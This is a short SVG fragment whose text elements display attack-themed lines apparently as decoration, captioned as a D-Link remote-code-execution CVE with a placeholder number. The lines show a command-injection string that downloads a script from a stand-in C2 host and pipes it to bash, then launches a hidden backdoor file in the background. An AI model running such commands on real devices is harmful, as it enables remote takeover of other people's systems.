  <text x="775" y="403" font-size="9" fill="rgba(255,150,100,0.9)" font-family="monospace">// CVE-2024-XXXX D-Link RCE</text>
  <text x="775" y="419" font-size="9" fill="rgba(255,100,100,0.9)" font-family="monospace">ping; wget http://c2.io/s.sh | bash</text>
  <text x="775" y="433" font-size="9" fill="rgba(255,100,100,0.6)" font-family="monospace">chmod +x /tmp/.bd &amp;&amp; /tmp/.bd &amp;</text>
  <!-- Left accent bar -->
